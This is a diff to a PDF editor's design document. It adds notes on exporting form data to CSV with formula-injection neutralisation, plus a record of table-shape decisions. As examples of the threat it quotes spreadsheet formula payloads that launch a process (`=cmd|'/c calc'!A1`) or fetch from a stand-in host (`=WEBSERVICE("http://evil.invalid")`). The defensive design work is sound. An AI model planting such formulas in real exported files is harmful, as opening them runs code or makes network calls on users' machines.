@@ -290,6 +290,35 @@ D:\Dev\pdfce\
                                    shared function — see §12's plain dated
                                    entry for why this is a correctness
                                    property, not a tidiness pass.
+                                   **`formcsv.rs` (`Pass 62.0`, 2026-08-11,
+                                   `a64b5fd`; §12 dated entries below):**
+                                   two-column `name,value` RFC 4180 CSV, a
+                                   third interchange format alongside
+                                   `fdf.rs`'s FDF/XFDF, hand-rolled rather
+                                   than reusing either reader (CSV shares
+                                   no syntax with FDF or XFDF). Export
+                                   runs every value through a
+                                   formula-injection neutraliser (a
+                                   leading `=`/`+`/`-`/`@` gets a leading
+                                   apostrophe) before writing — an
+                                   unneutralised cell would let a form
+                                   value pdfce did not author reach a
+                                   spreadsheet's live formula engine and,
+                                   via `=WEBSERVICE(...)`, the network:
+                                   the same capability **R12** refuses in
+                                   pdfce's own tree, reached by a longer
+                                   route. Neutralisation is counted AND
+                                   NAMED (R181's shape) and REVERSED on
+                                   import, so a round trip through a
+                                   spreadsheet does not accumulate
+                                   apostrophes. A malformed row (wrong
+                                   column count) or an empty file REFUSES
+                                   rather than risking a destructive
+                                   partial import. Format detection in
+                                   both shells is by CONTENT — FDF's `%`
+                                   header, XFDF's opening `<`, CSV as the
+                                   untried residue — not by file
+                                   extension.
     pdfce-render\               <- Takes pdfce-core's draw-op stream + resources
                                    (fonts, images, color spaces) and rasterizes to an
                                    in-memory pixel buffer via `tiny-skia` (CPU-only,
@@ -3643,6 +3672,22 @@ debug afterthought. Design points:
   coverage-only caveat unconditionally, not gated on a flag — see §3's
   `signature.rs` note and §12's decision-037/038 claims for the two
   spec questions this slice surfaced but did not settle.
+- **`pdfce-cli export-data --format csv` / `import-data` — a third
+  form-data interchange format alongside FDF/XFDF (`Pass 62.0`,
+  2026-08-11) — carries a security obligation the other two formats
+  don't.** A spreadsheet reads a cell beginning `=`/`+`/`-`/`@` as a
+  live formula, not text, so an unneutralised form value can trigger a
+  process launch or a network fetch (`=WEBSERVICE(...)`) the moment
+  the exported file is opened — the same capability §1.1/**R12**
+  already refuses inside pdfce's own tree, reached here by handing the
+  spreadsheet the trigger instead. Export neutralises with a leading
+  apostrophe, discloses every neutralised field BY NAME, and import
+  reverses it exactly, so a round trip through a spreadsheet does not
+  accumulate apostrophes. See §3's `formcsv.rs` note and §12's
+  2026-08-11 entries for the full design and the tall-vs-wide shape
+  decision (the wide, one-row-per-document shape for batch-filling
+  many copies of one form is a distinct, unbuilt feature — see
+  `docs/ROADMAP.md` *Backlog*).
 - **Exit codes matter.** Since this is meant to be genuinely scriptable
   (unlike Acrobat, which has no real CLI), follow normal Unix
   conventions: `0` success, non-zero on any failure, with a specific,
@@ -16555,3 +16600,125 @@ the same precondition differently on purpose — is exactly the kind of
 API-design reasoning `docs/decisions/` and §12 exist to keep from being
 re-derived from scratch the next time a Table-228-shaped precondition
 shows up on a different field type.
+
+### 2026-08-11 (ninetieth filing, `a64b5fd` design + `23eee9b` GUI wiring) — a CSV cell is not inert: exporting form data to a spreadsheet format is a second route to the network R12 already refuses, and the neutralisation is designed as a reversible, counted, disclosed transform of the CSV, not the document
+
+**Sourcing.** No shell tool this dispatch (hard rule 8) — neither
+commit's `git log`/`git show` was run. Recorded from the engineer's
+dispatch text, which described both commits' mechanism and
+verification in detail; not independently re-derived from source this
+filing.
+
+**Decision: form-data CSV export neutralises formula-triggering
+leading characters (`=`, `+`, `-`, `@`) with a leading apostrophe,
+because a form value pdfce did not author and cannot vouch for is
+about to become live spreadsheet input, not because CSV itself needs
+escaping.** A spreadsheet application reads a cell beginning with any
+of those four characters as a FORMULA on open, not as text — a field
+holding `=1+1` becomes live arithmetic, and the well-documented
+hostile shapes reach past the spreadsheet application entirely:
+`=cmd|'/c calc'!A1` launches a process, `=WEBSERVICE("http://...")`
+performs an outbound HTTP fetch. This is a formula-injection class of
+vulnerability well known in CSV-export tooling generally (not specific
+to PDF), but it is worth stating here as pdfce's own reasoned response
+rather than a borrowed checklist item, because of the next decision.
+
+**Decision, and the reason this earns a §12 entry rather than staying
+a `ROADMAP.md`-only note: writing an unneutralised `=WEBSERVICE(...)`
+cell is a SECOND route to the same capability §1.1 and standing rule
+R12 already refuse inside pdfce's own tree.** pdfce contains no HTTP/
+TLS/socket client anywhere in its dependency graph, by design (R12) —
+but a CSV cell that a spreadsheet will evaluate as a live formula on
+open is a way of causing a network fetch to happen ON THE OPERATOR'S
+BEHALF without pdfce ever opening a socket itself. The boundary R12
+draws is about what pdfce's OWN process does; it says nothing, by
+itself, about a file pdfce hands to a program that will interpret part
+of that file as executable instruction. Treating CSV export as "just a
+data format" and skipping neutralisation would have made pdfce the
+thing that supplied the trigger for a capability its own standing rule
+forbids it from exercising directly — the same violation by a longer,
+less obvious path. This is the general shape any future export path
+into an interpreted consumer format (a second spreadsheet dialect, a
+shell script, a macro-bearing document) needs to be checked against
+before it ships: **does the target format have a live-code
+interpretation of any byte sequence this data can legally contain, and
+if so, does an unvetted PDF value reach it unescaped?**
+
+**Decision: neutralisation is designed against three independently
+tested properties, not merely "does the dangerous string get an
+apostrophe."** (1) The source PDF is unchanged — neutralising is a
+property of the CSV file being written, never a mutation applied to
+the document's own `/V` entries. (2) The change is DISCLOSED, not
+silent — every neutralised field is counted AND NAMED in the export
+summary (the same discipline standing rule R181 established for a
+different disclosure: a bare count answers "how much," only names
+answer "did the right thing happen," and an operator checking their
+own export needs to know WHICH field changed, not merely that
+something did). (3) The transform is REVERSIBLE on import — a value
+neutralised on export and never touched by the operator restores to
+its exact original bytes on re-import, so a plain export→open→
+re-import round trip through a real spreadsheet does not accumulate a
+second leading apostrophe. All three were verified against the same
+concrete case: a field set to `=WEBSERVICE("http://evil.invalid")`
+exports with a leading apostrophe and a named disclosure line, and
+re-importing the resulting CSV restores the field to the exact
+unneutralised string.
+
+**Decision: `-` (a bare leading minus) is included in the neutralised
+set, deliberately conservatively, even though a negative number is the
+far more common reason a real form value starts with one.** Excel
+resolves a leading `-5` as a number and a leading `-cmd|...` as a
+formula, and the first character alone cannot distinguish the two
+cases — there is no cheap, correct rule that neutralises the dangerous
+shape without also touching some legitimate negative numbers. The
+alternative — refusing to export any field whose value begins with `-`
+— was considered and rejected as the worse trade: an operator would
+lose a legitimate export over one statistically unlucky character,
+where the chosen design instead costs that same operator a visible,
+reversible apostrophe on a small number of fields that were never
+attacker-controlled. Both properties above (disclosed, reversible)
+exist specifically so this conservative choice is cheap to notice and
+cheap to undo, rather than a silent distortion of exported data.
+
+### 2026-08-11 (ninetieth filing, `a64b5fd`) — form-data CSV is two columns (`name,value`), not one column per field; the wide, batch-across-documents shape is a distinct, unscoped feature and was deliberately not built inside this Pass
+
+**Sourcing.** Same dispatch as the entry immediately above; no shell
+tool, recorded from the engineer's dispatch text.
+
+**Decision: `formcsv.rs` writes and reads a TALL two-column table
+(`name,value`, one row per field of ONE document), not a WIDE table
+(one row per document, one column per field).** Both shapes are real,
+useful, and already have real-world precedent in how PDF form tooling
+is used: the tall shape answers "what are THIS document's field
+values" and is the direct peer of FDF/XFDF (Pass 7.1) — a single
+document's data, interchangeable with any spreadsheet or script that
+wants to read or write one form's answers. The wide shape answers a
+structurally different question — "fill N copies of the SAME form from
+N rows of one spreadsheet" — and its natural unit of work is a BATCH
+across many documents, not the fields of one already-open document.
+
+**Why the wide shape was not folded into this Pass instead of, or
+alongside, the tall one.** Building the wide shape here would have
+made `Pass 62.0` half of an unbuilt batch-fill feature rather than a
+complete, shippable peer of FDF/XFDF — the wide shape's own correctness
+obligations (which spreadsheet row maps to which output file; what
+happens when a row is short a column pdfce's own field set expects;
+how the same formula-injection neutralisation from the entry above
+applies across potentially thousands of cells instead of tens) are a
+distinct scoping exercise pdfce's existing Batch Tools surface is the
+more natural home for, not a corner of a single-document export/import
+verb. Recorded as a Backlog entry (`docs/ROADMAP.md`) rather than
+speculatively built, per this project's standing preference for named,
+unscoped gaps over guessed-at implementations.
+
+**Not a crate-boundary or round-trip-invariant change.** `formcsv.rs`
+lives entirely inside `pdfce-core`'s existing form-data model
+(`FieldData` and friends, the same types FDF/XFDF already read and
+write) and adds no new crate dependency; CSV parsing/writing is
+hand-rolled with no external crate, matching the project's existing
+zero-new-dependency precedent for FDF/XFDF (§12's 2026-08-01 entry).
+Recorded in §12 because the *shape* decision — tall vs. wide, and why
+the wide shape is a different unit of work rather than a bigger
+version of the same one — is exactly the kind of scoping reasoning a
+future session should not have to re-derive when the wide shape is
+eventually built.
